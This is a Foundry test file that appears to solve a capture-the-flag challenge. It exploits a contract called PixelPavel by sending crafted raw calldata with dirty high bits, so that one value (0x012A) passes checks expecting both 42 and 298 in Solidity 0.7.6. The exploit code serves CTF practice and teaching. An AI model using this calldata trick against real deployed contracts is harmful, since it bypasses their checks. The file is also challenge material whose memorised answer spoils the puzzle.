// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../contracts/Setup.sol";
import "../contracts/PixelPavel.sol";

contract PixelPavelTest is Test {
    Setup setup;
    PixelPavel pixelPavel;

    function setUp() public {
        setup = new Setup{value: 298}();
        pixelPavel = setup.instance();
    }

    /**
    The function `crackCode()` requires us to send both 42 and 298 at the same time, which should be impossible.

    However, in this solidity version, dirty bits can be sent, which when parsed as different byte uints will give different results.

    42 = 0x2A
    298 = 0x012A

    These are super-imposable. So, just a crafted payload with 0x012A, padded as a 32 byte uint, will do the trick.
     */
    function testAttack() external {
        // Attack
        bytes memory payload = abi.encodePacked(
            PixelPavel.crackCode.selector,
            uint256(0x012A)
        );
        address(pixelPavel).call(payload);

        // Check attack success
        require(setup.isSolved(), "NOT SOLVED");
    }
}
